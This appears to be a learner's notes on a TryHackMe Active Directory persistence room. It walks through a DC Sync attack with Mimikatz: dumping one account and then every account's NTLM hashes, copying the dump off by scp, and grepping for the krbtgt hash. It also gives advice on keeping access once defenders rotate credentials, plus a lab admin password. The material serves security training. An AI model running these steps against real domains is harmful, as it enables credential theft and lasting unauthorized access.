When discussing persistence techniques, you will use the privileged credentials to perform the persistence technique on your low-privileged credential set. Make a note of the following DA account:
- Username: `Administrator`
- Password: `tryhackmewouldnotguess1@`
- Domain: `ZA`

The first and least reliable persistence technique that we will discuss is credentials. Several of the lateral techniques discussed in previous rooms would have resulted in the attacker gaining access to credentials. When using the word credentials, it can mean a username and password pair, but in the context of AD, even the password hash is sufficient for authentication through pass-the-hash techniques.

## DC Sync
It is not sufficient to have a single domain controller per domain in large organisations. These domains are often used in multiple regional locations, and having a single DC would significantly delay any authentication services in AD. As such, these organisations make use of multiple DCs. The question then becomes, *how is it possible for you to authenticate using the same credentials in two different offices*?*

The answer to that question is *domain replication*. Each domain controller runs a process called the *Knowledge Consistency Checker (KCC)*. The *KCC* generates a replication topology for the AD forest and automatically connects to other domain controllers *through Remote Procedure Calls (RPC)* to synchronise information. 

This includes updated information such as the user's new password and new objects such as when a new user is created. This is why you usually have to *wait a couple of minutes before you authenticate after you have changed your password* since the *DC where the password change occurred could perhaps not be the same one as the one where you are authenticating to.*

The process of replication is called *DC Synchronisation*. It is not just the DCs that can initiate replication. Accounts such as those belonging to the Domain Admins groups can also do it for legitimate purposes such as creating a new domain controller.

A popular attack to perform is a *DC Sync attack*. If we have access to an account that has domain replication permissions, we can stage a DC Sync attack to harvest credentials from a DC.

**Not All Credentials Are Created Equal**
Before starting our DC Sync attack, let's first discuss what credentials we could potentially hunt for. While we should always look to dump privileged credentials such as those that are members of the Domain Admins group, *these are also the credentials that will be rotated* (a blue team term meaning to reset the account's password) first. As such, *if we only have privileged credentials, it is safe to say as soon as the blue team discovers us, they will rotate those accounts, and we can potentially lose our access.*

The goal then is to persist with near-privileged credentials. We don't always need the full keys to the kingdom; we just need enough keys to ensure we can still achieve goal execution and always make the blue team look over their shoulder. As such, we should attempt to persist through credentials such as the following:

- **Credentials that have local administrator rights on several machines.** Usually, organisations have a group or two with local admin rights on almost all computers. These groups are typically divided into one for workstations and one for servers. By harvesting the credentials of members of these groups, we would still have access to most of the computers in the estate.
-  **Service accounts that have delegation permissions.** With these accounts, we would be able to force golden and silver tickets to perform Kerberos delegation attacks.
-  **Accounts used for privileged AD services.** If we compromise accounts of privileged services such as Exchange, Windows Server Update Services (WSUS), or System Center Configuration Manager (SCCM), we could leverage AD exploitation to once again gain a privileged foothold.

When it comes to what credentials to dump and persist through, it is subject to many things. You will have to get creative in your thinking and take it on a case-by-case basis.

## DCSync All
We will be using Mimikatz to harvest credentials. SSH into THMWRK1 using the DA account and load Mimikatz; Let's start by performing a DC Sync of a single account, our own:

```markup
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /user:{Your low-privilege AD Username}

[DC] 'za.tryhackme.loc' will be the domain
[DC] 'THMDC.za.tryhackme.loc' will be the DC server 
[DC] 'aaron.jones' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : aaron.jones 

** SAM ACCOUNT **

SAM Username         : aaron.jones
Account Type         : 30000000 ( USER_OBJECT )    
User Account Control : 00000200 ( NORMAL_ACCOUNT ) 
Account expiration   :
Password last change : 4/25/2022 7:30:21 PM
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1429 
Object Relative ID   : 1429

Credentials:
  Hash NTLM: fbdcd5041c96ddbd82224270b57f11fc 
    ntlm- 0: fbdcd5041c96ddbd82224270b57f11fc 
    lm  - 0: 0fd2685aa18c78bd265d02bdec203b04 

[...]

* Primary:WDigest * 
    01  991d45386dd3561e0c5529d3605f96e6
    02  d5d6f25b233c87b289706d7b423f1145
[...]
```

This is great and all, but we want to DC sync every single account. To do this, we will have to enable logging on Mimikatz:
```
mimikatz # log {username}_dcdump.txt Using '{username}_dcdump.txt' for logfile: OK
```

Now, instead of specifying our account, we will use the `/all` flag:
```
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all
```

This will take a bit of time to complete. Once done, exit Mimikatz to finalise the dump find and then you can download the `<username>_dcdump.txt` file. You can use `cat <username>_dcdump.txt | grep "SAM Username"` to recover all the usernames and `cat <username>_dcdump.txt | grep "Hash NTLM"` for all hashes. We can now either perform an offline password cracking attack to recover the plain text credentials or simply perform a pass the hash attack with Mimikatz.

```

```
lsadump::dcsync /domain:za.tryhackme.loc /all
```

- download the dump file on our attacking machine (using SCP):
```
Windows path -> C:\Tools\mimikatz_trunk\x64\leon.hobbs_dcdump.txt

scp za\\Administrator@thmwrk1.za.tryhackme.loc:C:/Tools/mimikatz_trunk/x64/leon.hobbs_dcdump.txt /root/Downloads
```

```
cat <username>_dcdump.txt | grep "SAM Username"
cat <username>_dcdump.txt | grep "Hash NTLM"
```

- What is the NTLM hash associated with the krbtgt user?
```
lsadump::dcsync /domain:za.tryhackme.loc /user:leon.hobbs
```
OR
```
cat leon.hobbs_dcdump.txt | grep -A 6 "krbtgt" | grep "Hash NTLM"
```
	 -A 6 (output 6 lines which include Hash NTLM credentials)
